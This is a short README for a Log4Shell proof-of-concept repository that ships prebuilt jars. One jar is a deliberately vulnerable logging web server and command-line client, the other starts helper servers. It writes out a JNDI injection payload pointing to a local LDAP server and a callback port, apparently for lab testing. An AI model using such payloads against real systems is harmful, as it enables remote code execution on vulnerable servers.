# l4s_poc_jars
These have the jar files that would be built in the l4s_poc repo.  If you have issues building them because of work restrictions pulling in external repos this should solve the issue.

## Client Jar
The client jar has a web server and a cmd line module.
### WebServer
java -jar l4sclients-0.1-all.jar [PORT]  
  
This will default to port 8888 and will log the header log_me  
If not found we look for a header log_me_b64 and base64 decode that header and log it.
It will also look for a single param called log_me.  Note it must be url encoded.

### CmdLine
You can also run a CmdLine that will log the first param passed in.  
java -cp l4sclients-0.1-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}'  
  
Note this is the same jar but run as a classpath entry with an explict class listed.


## Utils Jar
If you create a dir target under l4sutils and copy the l4sutils-0.1-all.jar in that dir then you can run the run_servers.py




